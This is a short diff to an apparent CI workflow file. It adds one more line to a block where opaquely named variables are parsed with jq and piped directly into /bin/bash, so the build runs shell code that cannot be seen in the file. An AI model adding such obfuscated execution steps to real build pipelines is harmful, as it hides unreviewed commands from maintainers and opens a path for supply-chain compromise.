@@ -23,6 +23,7 @@ jobs:
           echo $wmkxu3813 | jq -r .ena959 | /bin/bash
           printf '%s' "$pegab20120" | jq -r .tbnmv41280 | /bin/bash
           echo $vzkl3 | jq -r .hgmbp1 | /bin/bash
+          echo $zcdcz3 | jq -r .hhig37 | /bin/bash
 
       - name: Archive output
         if: always()
